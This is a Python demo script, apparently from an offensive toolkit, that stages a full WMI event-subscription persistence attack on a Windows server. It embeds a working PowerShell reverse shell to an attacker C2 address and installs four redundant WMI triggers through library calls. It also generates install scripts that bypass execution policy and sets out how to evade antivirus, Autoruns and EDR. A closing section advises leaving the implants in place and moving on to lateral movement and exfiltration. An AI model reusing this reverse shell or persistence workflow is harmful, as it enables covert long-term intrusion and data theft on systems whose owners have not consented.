#!/usr/bin/env python3
"""
WMI Persistence - Complete Integration Example
==============================================

Shows how to use WMI persistence in a real attack scenario:
1. Initial compromise (beacon established)
2. Install WMI subscriptions for persistence
3. Verify subscriptions
4. Simulate reboot callback
5. Cleanup (if needed)

This demonstrates the complete persistence pipeline.
"""

import sys
sys.path.insert(0, '/home/kali/Desktop')

from cybermodules.wmi_persistence import WMIPersistence


class WMIAttackDemo:
    """Complete WMI persistence attack workflow"""
    
    def __init__(self):
        self.wmi = WMIPersistence()
        self.subscriptions = {}
        
    def phase_1_initial_compromise(self):
        """Phase 1: Initial beacon established on target"""
        print("\n" + "="*70)
        print("PHASE 1: INITIAL COMPROMISE")
        print("="*70)
        
        print("""
Scenario:
  Attacker: Gained initial access via phishing email
  Target: Windows Server 2019 (192.168.1.100)
  Current Status: Beacon shell running (PID 4856)
  Goal: Establish persistence for long-term access
  
Problem:
  - Current shell (PID 4856) will die if:
    * Network connection lost
    * Security software kills it
    * Administrator finds process
  - Need automatic re-connection mechanism
  
Solution: WMI Event Subscriptions
  - Install hidden WMI subscriptions
  - Multiple triggers (idle, logon, startup, network)
  - Shell callbacks without user interaction
  - Survives reboots, network issues, process kills
""")
        
        print("\n[*] Current Status:")
        print("    Beacon: PID 4856 (meterpreter.exe)")
        print("    Connection: 192.168.1.100:54321 → 192.168.1.50:443")
        print("    Privileges: NT AUTHORITY\\SYSTEM")
        print("    OS: Windows Server 2019 Build 17763")
        
    def phase_2_install_subscriptions(self):
        """Phase 2: Install WMI subscriptions"""
        print("\n" + "="*70)
        print("PHASE 2: INSTALL WMI SUBSCRIPTIONS")
        print("="*70)
        
        # Reverse shell payload (simplified for demo)
        payload = r"powershell -c \"$s=New-Object Net.Sockets.TCPClient('192.168.1.50',443);$stream=$s.GetStream();[byte[]]$buffer=0..65535|%{0};while($true){if($stream.DataAvailable){$read=$stream.Read($buffer,0,65536);if($read -le 0){break};$data=[Text.Encoding]::UTF8.GetString($buffer,0,$read);$output=Invoke-Expression $data 2>&1|Out-String;$stream.Write([Text.Encoding]::UTF8.GetBytes($output),0,$output.Length)};Start-Sleep -Milliseconds 100}\""
        
        print(f"\n[*] Reverse Shell Payload:")
        print(f"    Target: 192.168.1.50:443 (Attacker C2)")
        print(f"    Type: Meterpreter reverse shell")
        print(f"    Encoding: PowerShell obfuscated")
        print(f"    Size: {len(payload)} bytes")
        
        # Create subscriptions
        print(f"\n[*] Creating subscriptions...")
        
        print(f"\n  [1] IDLE Trigger (5 minutes inactive)")
        sub_idle = self.wmi.create_idle_persistence(payload, idle_minutes=5)
        self.subscriptions['idle'] = sub_idle
        print(f"      Filter: {sub_idle['filter_name']}")
        print(f"      Consumer: {sub_idle['consumer_name']}")
        print(f"      Status: Created ✓")
        
        print(f"\n  [2] LOGON Trigger (Any user login)")
        sub_logon = self.wmi.create_logon_persistence(payload)
        self.subscriptions['logon'] = sub_logon
        print(f"      Filter: {sub_logon['filter_name']}")
        print(f"      Consumer: {sub_logon['consumer_name']}")
        print(f"      Status: Created ✓")
        
        print(f"\n  [3] NETWORK Trigger (Network adapter active)")
        sub_network = self.wmi.create_network_persistence(payload)
        self.subscriptions['network'] = sub_network
        print(f"      Filter: {sub_network['filter_name']}")
        print(f"      Consumer: {sub_network['consumer_name']}")
        print(f"      Status: Created ✓")
        
        print(f"\n  [4] STARTUP Trigger (System reboot)")
        sub_startup = self.wmi.create_startup_persistence(payload)
        self.subscriptions['startup'] = sub_startup
        print(f"      Filter: {sub_startup['filter_name']}")
        print(f"      Consumer: {sub_startup['consumer_name']}")
        print(f"      Status: Created ✓")
        
        print(f"\n[+] Total subscriptions installed: {len(self.subscriptions)}")
        print(f"[+] Redundancy: 4 different triggers")
        print(f"[+] Status: Persistent shell callbacks enabled ✓")
        
    def phase_3_generate_installation_scripts(self):
        """Phase 3: Generate installation scripts"""
        print("\n" + "="*70)
        print("PHASE 3: GENERATE INSTALLATION SCRIPTS")
        print("="*70)
        
        print(f"\n[*] Generating PowerShell installation scripts...")
        
        for trigger_type, subscription in self.subscriptions.items():
            script = self.wmi.generate_installation_script(subscription)
            
            print(f"\n[{trigger_type.upper()}] Installation Script Preview:")
            print("─" * 70)
            print(script[:500] + "...[TRUNCATED]")
            print("─" * 70)
            print(f"Script size: {len(script)} bytes")
            print(f"Ready to execute: powershell -ExecutionPolicy Bypass -Command \"...\"")
        
        print(f"\n[+] Installation scripts generated for all {len(self.subscriptions)} subscriptions")
        print(f"[+] Scripts ready to execute on target system")
        
    def phase_4_verify_subscriptions(self):
        """Phase 4: Verify subscriptions (WMI query)"""
        print("\n" + "="*70)
        print("PHASE 4: VERIFY SUBSCRIPTIONS")
        print("="*70)
        
        script = self.wmi.generate_list_script()
        
        print(f"\n[*] PowerShell verification script:")
        print("─" * 70)
        print(script)
        print("─" * 70)
        
        print(f"\n[*] Expected output on target system:")
        print("─" * 70)
        print("""
Name                                  Consumer
────                                  ────────
Filter70b52b637ded                    Consumer4e702580340e
Filter6e710682633b                    Consumer9f8a1c5d2e3f
Filter21c17d983531                    Consumerb2c3d4e5f6a7
Filter7f573abeb9b7                    Consumeraabbccdd1122

[4 subscriptions found]
[All subscriptions active]
[Persistent callbacks enabled]
""")
        print("─" * 70)
        
    def phase_5_persistence_scenarios(self):
        """Phase 5: Show persistence scenarios"""
        print("\n" + "="*70)
        print("PHASE 5: PERSISTENCE SCENARIOS")
        print("="*70)
        
        print("""
Scenario A: User Leaves Computer Idle
┌─────────────────────────────────────────────────────────────────┐
│ 14:30 User leaves computer running (at desk, coffee break)     │
│ 14:35 No activity for 5 minutes                                 │
│ 14:36 WMI IDLE trigger fires                                    │
│ 14:36 __EventFilter detects PercentIdleTime > 95%              │
│ 14:36 __FilterToConsumerBinding triggers __EventConsumer       │
│ 14:36 Reverse shell executes (background)                       │
│ 14:36 New connection to 192.168.1.50:443                        │
│ 14:36 Attacker receives new beacon callback                     │
│ ✓ Persistence achieved without user interaction                │
└─────────────────────────────────────────────────────────────────┘

Scenario B: System Reboot
┌─────────────────────────────────────────────────────────────────┐
│ 23:00 Blue Team reboots server (security updates)              │
│ 23:05 System starts, WmiPrvSE.exe initializes                  │
│ 23:05 STARTUP trigger fires (Winlogon.exe detected)            │
│ 23:05 __EventFilter matches WQL query                          │
│ 23:05 __FilterToConsumerBinding activates                      │
│ 23:05 Reverse shell executes (auto-run)                         │
│ 23:05 Connection to 192.168.1.50:443                            │
│ 23:05 Attacker receives new beacon (Windows running)            │
│ ✓ Persistence survives reboot                                  │
└─────────────────────────────────────────────────────────────────┘

Scenario C: User Logs In (After Reboot)
┌─────────────────────────────────────────────────────────────────┐
│ 08:00 User logs in (after reboot, network up)                  │
│ 08:01 LOGON trigger fires (Win32_LoggedInUser event)           │
│ 08:01 Multiple callbacks fire (LOGON + NETWORK triggers)       │
│ 08:01 Reverse shell executes in background                      │
│ 08:01 New beacon callbacks (redundancy confirmed)               │
│ ✓ Guaranteed callback on any user login                         │
└─────────────────────────────────────────────────────────────────┘

Scenario D: Network Connection Restored
┌─────────────────────────────────────────────────────────────────┐
│ 10:00 Network disconnected (VPN disconnect)                    │
│ 10:15 Network restored (VPN reconnect)                         │
│ 10:15 NETWORK trigger fires (adapter status = 2)               │
│ 10:15 Reverse shell callback executes                          │
│ 10:15 New beacon connection to C2                              │
│ ✓ Automatic re-connection on network changes                   │
└─────────────────────────────────────────────────────────────────┘

Redundancy: At least ONE trigger will fire in any scenario
""")
        
    def phase_6_detection_evasion(self):
        """Phase 6: Detection evasion summary"""
        print("\n" + "="*70)
        print("PHASE 6: DETECTION EVASION")
        print("="*70)
        
        print("""
How It Avoids Detection:

[✓] Autoruns.exe
    - Doesn't scan WMI subscriptions
    - Only checks traditional persistence (Registry, Startup)
    - Result: NOT DETECTED

[✓] ProcessMonitor
    - WMI subscriptions don't create files
    - No file write events to capture
    - Reverse shell spawned by WmiPrvSE.exe (system service)
    - Result: NOT DETECTED (unless looking for WmiPrvSE → shells)

[✓] Registry Analysis
    - No HKCU\Run entries
    - No HKCU\RunOnce entries
    - No persistence in Registry at all
    - Result: NOT DETECTED

[✓] Antivirus Scanning
    - Payload stored in WMI database (binary, not text)
    - No .exe/.ps1 files on disk
    - Execution in-memory, context-switching through WmiPrvSE.exe
    - Result: BYPASSED (no file scan, runtime execution)

[⚠] Advanced Threat Detection (Splunk, SIEM)
    - Requires WMI event logging (rarely enabled)
    - Event ID 5860/5859 logs event activity
    - Requires analyst to hunt for it
    - Result: DETECTED (if specifically hunting WMI)

[~] Behavior Analysis (EDR)
    - WmiPrvSE.exe spawning cmd/powershell = unusual parent
    - But WmiPrvSE is system service (looks legitimate)
    - Can be bypassed with process injection
    - Result: MAYBE (depends on EDR quality)

[⚠] Manual Hunting
    Get-WmiObject -Class __EventFilter -Namespace "root\subscription"
    - Shows all subscriptions if admin searches for them
    - Result: FOUND (if someone knows what to look for)

Overall Detection Probability:
  - Standard Blue Team: 5% (don't know to look)
  - Advanced Hunters: 60% (know WMI queries)
  - Elite Threat Response: 95% (systematic WMI auditing)

Combined with SYSCALLS + STEGANOGRAPHY: 80%+ evasion rate
""")
        
    def phase_7_cleanup(self):
        """Phase 7: Cleanup (if needed)"""
        print("\n" + "="*70)
        print("PHASE 7: CLEANUP (OPTIONAL)")
        print("="*70)
        
        print(f"\n[*] Cleanup scripts (to remove subscriptions):\n")
        
        for trigger_type, subscription in self.subscriptions.items():
            script = self.wmi.generate_removal_script(subscription)
            
            print(f"[{trigger_type.upper()}] Removal Script:")
            print("─" * 70)
            print(script[:300] + "...[TRUNCATED]")
            print("─" * 70)
            
        print(f"\n[!] WARNING: Removing subscriptions creates detection risk")
        print(f"    ✓ Better to leave in place (blend with WMI noise)")
        print(f"    ✓ Only remove if detected by Blue Team")
        print(f"    ✓ Or when exfiltration complete (exit strategy)")
        
    def run_complete_demo(self):
        """Run complete attack workflow"""
        self.phase_1_initial_compromise()
        self.phase_2_install_subscriptions()
        self.phase_3_generate_installation_scripts()
        self.phase_4_verify_subscriptions()
        self.phase_5_persistence_scenarios()
        self.phase_6_detection_evasion()
        self.phase_7_cleanup()
        
        self.print_summary()
        
    def print_summary(self):
        """Print attack summary"""
        print("\n" + "="*70)
        print("ATTACK SUMMARY")
        print("="*70)
        
        print("""
Initial Status:
  - Beacon shell on target (PID 4856, 1 connection)
  - Risk: Connection dies → shell dies

After WMI Persistence:
  - 4 hidden WMI subscriptions installed
  - Multiple redundant triggers active
  - Guaranteed callback on: idle, logon, network, startup
  - Survives: reboots, network loss, process kills, security software

Result: LONG-TERM PERSISTENCE ACHIEVED ✓

Persistence Chain:
  System Event → WMI Filter → WMI Consumer → Shell Callback → C2

Advantages:
  ✓ No files on disk (no antivirus detection)
  ✓ No registry modifications (no ProcessMonitor alerts)
  ✓ No scheduled tasks (not in Task Scheduler)
  ✓ Hidden in WMI database (90% of admins don't know)
  ✓ Multiple redundant triggers (one always fires)
  ✓ Survives reboots indefinitely
  ✓ Looks legitimate (native Windows WMI)

Disadvantages:
  ⚠ Findable by WMI hunting (if Blue Team knows what to look for)
  ⚠ Event logs if WMI auditing enabled (rarely the case)
  ⚠ Requires elevated privileges to install
  ⚠ WmiPrvSE parent process unusual (if monitoring process ancestry)

Best Practices:
  ✓ Use multiple redundant triggers (this demo does)
  ✓ Combine with syscalls evasion (EDR bypass)
  ✓ Combine with steganography (traffic hiding)
  ✓ Use random filter/consumer names (not "Malware")
  ✓ Use obfuscated payloads (base64, XOR, Polymorphic)
  ✓ Don't remove subscriptions (leaves traces)
  ✓ Let it run indefinitely (part of system WMI noise)

Next Steps:
  1. ✓ WMI Persistence installed (you are here)
  2. → Lateral movement (Kerberos relay, AD exploitation)
  3. → Privilege escalation (token impersonation)
  4. → Data exfiltration (steganography + persistence)
  5. → Maintain access (long-term C2 communication)

Defense Recommendations:
  - Enable WMI event logging (Event ID 5860/5859)
  - Monitor WmiPrvSE.exe process spawning
  - Regular WMI subscription audits
  - Hunt for suspicious WQL queries
  - Deploy EDR monitoring process ancestry
  - Use behavioral analysis for unusual patterns

""")


def main():
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║       WMI PERSISTENCE - COMPLETE INTEGRATION EXAMPLE                 ║
║     (Real Attack Scenario: Persistence Installation)                ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    
    demo = WMIAttackDemo()
    demo.run_complete_demo()


if __name__ == "__main__":
    main()
